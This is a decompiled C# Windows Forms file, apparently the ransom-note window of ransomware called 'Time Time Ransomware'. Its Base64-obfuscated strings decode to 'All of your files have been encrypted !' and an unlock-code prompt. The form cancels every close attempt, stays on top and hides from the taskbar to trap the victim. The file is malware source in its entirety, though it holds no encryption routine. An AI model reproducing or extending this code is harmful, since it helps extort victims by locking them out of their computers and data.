using System;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace ns0;

public class GForm1 : Form
{
	private IContainer icontainer_0 = null;

	private Label label_0;

	private Label label_1;

	private TextBox textBox_0;

	private Button button_0;

	private Label label_2;

	private Button button_1;

	public GForm1()
	{
		method_1();
	}

	private void GForm1_Load(object sender, EventArgs e)
	{
	}

	private void method_0(object sender, EventArgs e)
	{
	}

	private void button_1_Click(object sender, EventArgs e)
	{
		((Control)new GForm0()).Show();
	}

	private void GForm1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void vmethod_0(bool bool_0)
	{
		if (bool_0 && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(bool_0);
	}

	private void method_1()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_02a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ac: Expected O, but got Unknown
		//IL_0361: Unknown result type (might be due to invalid IL or missing references)
		//IL_036b: Expected O, but got Unknown
		//IL_0425: Unknown result type (might be due to invalid IL or missing references)
		//IL_042f: Expected O, but got Unknown
		//IL_05ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f4: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm1));
		label_0 = new Label();
		label_1 = new Label();
		textBox_0 = new TextBox();
		button_0 = new Button();
		label_2 = new Label();
		button_1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_Font(new Font(Encoding.UTF8.GetString(Convert.FromBase64String("TWljcm9zb2Z0IFNhbnMgU2VyaWY=")), 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_0).set_Location(new Point(98, 9));
		((Control)label_0).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("bGFiZWwx")));
		((Control)label_0).set_Size(new Size(465, 31));
		((Control)label_0).set_TabIndex(0);
		((Control)label_0).set_Text(Encoding.UTF8.GetString(Convert.FromBase64String("QWxsIG9mIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZCAh")));
		((Control)label_1).set_AutoSize(true);
		((Control)label_1).set_Font(new Font(Encoding.UTF8.GetString(Convert.FromBase64String("TWljcm9zb2Z0IFNhbnMgU2VyaWY=")), 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_1).set_Location(new Point(12, 84));
		((Control)label_1).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("bGFiZWwy")));
		((Control)label_1).set_Size(new Size(545, 96));
		((Control)label_1).set_TabIndex(1);
		((Control)label_1).set_Text(componentResourceManager.GetString(Encoding.UTF8.GetString(Convert.FromBase64String("bGFiZWwyLlRleHQ="))));
		((Control)textBox_0).set_BackColor(Color.FromArgb(32, 32, 32));
		((Control)textBox_0).set_Font(new Font(Encoding.UTF8.GetString(Convert.FromBase64String("U2Vnb2UgVUk=")), 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox_0).set_ForeColor(Color.White);
		((Control)textBox_0).set_Location(new Point(27, 246));
		((Control)textBox_0).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("dGV4dEJveDE=")));
		((Control)textBox_0).set_Size(new Size(331, 43));
		((Control)textBox_0).set_TabIndex(2);
		((ButtonBase)button_0).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button_0).set_FlatStyle((FlatStyle)0);
		((Control)button_0).set_Font(new Font(Encoding.UTF8.GetString(Convert.FromBase64String("TWljcm9zb2Z0IFNhbnMgU2VyaWY=")), 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button_0).set_Location(new Point(380, 246));
		((Control)button_0).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("YnV0dG9uMQ==")));
		((Control)button_0).set_Size(new Size(243, 43));
		((Control)button_0).set_TabIndex(3);
		((Control)button_0).set_Text(Encoding.UTF8.GetString(Convert.FromBase64String("Q2hlY2sgaWYgdGhlIGNvZGUgaXMgdmFsaWQ=")));
		((ButtonBase)button_0).set_UseVisualStyleBackColor(true);
		((Control)label_2).set_AutoSize(true);
		((Control)label_2).set_Font(new Font(Encoding.UTF8.GetString(Convert.FromBase64String("TWljcm9zb2Z0IFNhbnMgU2VyaWY=")), 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_2).set_Location(new Point(452, 340));
		((Control)label_2).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("bGFiZWwz")));
		((Control)label_2).set_Size(new Size(217, 24));
		((Control)label_2).set_TabIndex(4);
		((Control)label_2).set_Text(Encoding.UTF8.GetString(Convert.FromBase64String("VGltZSBUaW1lIFJhbnNvbXdhcmU=")));
		((ButtonBase)button_1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button_1).set_FlatStyle((FlatStyle)0);
		((Control)button_1).set_Font(new Font(Encoding.UTF8.GetString(Convert.FromBase64String("TWljcm9zb2Z0IFNhbnMgU2VyaWY=")), 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button_1).set_Location(new Point(16, 318));
		((Control)button_1).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("YnV0dG9uMg==")));
		((Control)button_1).set_Size(new Size(243, 43));
		((Control)button_1).set_TabIndex(5);
		((Control)button_1).set_Text(Encoding.UTF8.GetString(Convert.FromBase64String("U2VlIGVuY3J5cHRlZCBmaWxlcw==")));
		((ButtonBase)button_1).set_UseVisualStyleBackColor(true);
		((Control)button_1).add_Click((EventHandler)button_1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(32, 32, 32));
		((Form)this).set_ClientSize(new Size(681, 373));
		((Control)this).get_Controls().Add((Control)(object)button_1);
		((Control)this).get_Controls().Add((Control)(object)label_2);
		((Control)this).get_Controls().Add((Control)(object)button_0);
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(Encoding.UTF8.GetString(Convert.FromBase64String("Rm9ybTE=")));
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text(Encoding.UTF8.GetString(Convert.FromBase64String("Q3J5cHRvcg==")));
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(GForm1_FormClosing));
		((Form)this).add_Load((EventHandler)GForm1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
